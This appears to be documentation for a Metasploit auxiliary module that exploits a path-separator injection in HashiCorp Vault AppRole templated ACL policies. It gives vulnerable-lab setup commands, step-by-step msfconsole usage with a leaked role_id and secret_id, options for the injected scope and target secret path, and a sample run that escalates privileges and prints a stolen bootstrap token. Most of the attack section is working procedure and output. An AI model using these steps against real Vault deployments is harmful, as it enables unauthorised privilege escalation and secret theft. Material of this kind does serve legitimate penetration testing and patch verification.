## Vulnerable Application

HashiCorp Vault and Vault Enterprise up to and including **2.0.3** do not sanitize
path separators in identity metadata that is interpolated into templated ACL policy
paths (**CVE-2026-5006**, advisory **HCSEC-2026-32**). The issue is fixed in 2.0.4.

The vulnerability is exploitable when an AppRole is granted:

* a **templated read policy** whose path is driven by the presenting secret-id's own
  metadata, for example
  `secret/data/{{identity.entity.aliases.<accessor>.metadata.scope}}/*`, and
* the common self-service capability to **create/update its own secret-id**
  (`auth/approle/role/<role>/secret-id`).

A holder of a low-privileged `role_id` + `secret_id` (intended for a narrow scope such
as `edge/eu-west-2`) can mint a **new** secret-id whose `metadata.scope` contains
slashes (e.g. `platform/nomad/bootstrap`). Because Vault <= 2.0.3 does not sanitize
`/` in the interpolated metadata, logging in with that secret-id expands the templated
path **across segment boundaries**, granting read access to secrets outside the intended
scope, without ever holding a Vault root or admin token.

This module authenticates with a supplied (leaked) AppRole credential, mints a secret-id
carrying an attacker-chosen scope, re-authenticates, and reads a target KV v2 secret the
original credential could not reach.

### Setting up a vulnerable environment

Run Vault 2.0.3 in dev-adjacent mode with a file backend, then provision the templated
policy and role:

```
# with a root token exported as VAULT_TOKEN
ACC=$(vault auth list -format=json | jq -r '."approle/".accessor')

vault policy write edge-scoped - <<POL
path "secret/data/{{identity.entity.aliases.${ACC}.metadata.scope}}/*" {
  capabilities = ["read"]
}
path "auth/approle/role/edge-nifi/secret-id" {
  capabilities = ["create", "update"]
}
POL

vault write auth/approle/role/edge-nifi token_policies=edge-scoped token_ttl=20m
vault read  auth/approle/role/edge-nifi/role-id
vault write auth/approle/role/edge-nifi/custom-secret-id \
  secret_id=<known-secret-id> metadata='{"scope":"edge/eu-west-2"}'

# in-scope secret the role legitimately reads:
vault kv put secret/edge/eu-west-2/telemetry-db username=edge_ro password=demo
# out-of-scope crown jewel the role must NOT reach at baseline:
vault kv put secret/platform/nomad/bootstrap/token value=<target-token>
```

## Verification Steps

1. Obtain a leaked `role_id` and `secret_id` for the templated AppRole.
2. Start `msfconsole`.
3. `use auxiliary/gather/vault_approle_metadata_slash_injection`
4. `set RHOSTS <vault-host>`
5. `set ROLE_ID <role_id>`
6. `set SECRET_ID <secret_id>`
7. (optional) adjust `APPROLE_NAME`, `INJECT_SCOPE`, `SECRET_PATH` for the target layout.
8. `run`
9. The out-of-scope secret contents are printed and stored to loot.

## Options

### ROLE_ID
AppRole `role_id` of the leaked credential. Required.

### SECRET_ID
AppRole `secret_id` of the leaked credential. Required.

### APPROLE_NAME
Name of the AppRole the leaked credential is allowed to self-rotate. This must match the
role referenced by the `auth/approle/role/<name>/secret-id` create/update grant. Default
`edge-nifi`.

### INJECT_SCOPE
The value placed into the newly minted secret-id's `metadata.scope`. Because it is
interpolated into the templated policy path, slashes traverse across path segments.
Default `platform/nomad/bootstrap`.

### SECRET_PATH
KV v2 data path to read after escalation. For a KV v2 mount at `secret/`, a secret stored
at `secret/foo/bar` is read at `secret/data/foo/bar`. Default
`secret/data/platform/nomad/bootstrap/token`.

### VAULT_NAMESPACE (advanced)
Optional Vault Enterprise namespace, sent as the `X-Vault-Namespace` header.

## Scenarios

### Vault 2.0.3, edge-nifi AppRole, recovering a Nomad management token

```
msf6 > use auxiliary/gather/vault_approle_metadata_slash_injection
msf6 auxiliary(gather/vault_approle_metadata_slash_injection) > set RHOSTS 172.17.0.4
msf6 auxiliary(gather/vault_approle_metadata_slash_injection) > set ROLE_ID 0731f737-c67e-4508-b79d-064ce35bc64a
msf6 auxiliary(gather/vault_approle_metadata_slash_injection) > set SECRET_ID 2116cb55-ff51-4e7f-b7b3-34cb9ebb6347
msf6 auxiliary(gather/vault_approle_metadata_slash_injection) > run

[*] Running module against 172.17.0.4
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. HashiCorp Vault 2.0.3 is affected by CVE-2026-5006
[+] Authenticated with the leaked AppRole credential (token hvs.CAESIHcd...)
[*] Baseline read of secret/data/platform/nomad/bootstrap/token denied (HTTP 403), attempting slash injection
[+] Minted secret-id with injected metadata.scope=platform/nomad/bootstrap (347892fa-6fe...)
[+] Acquired escalated token (hvs.CAESIIR4...)
[+] Recovered secret at secret/data/platform/nomad/bootstrap/token:
    value = 6322b903-fe5d-44ad-ab60-710e0845a8da
[+] Secret contents stored in loot: /root/.msf4/loot/..._hashicorp.vault._......bin
[*] Auxiliary module execution completed
```
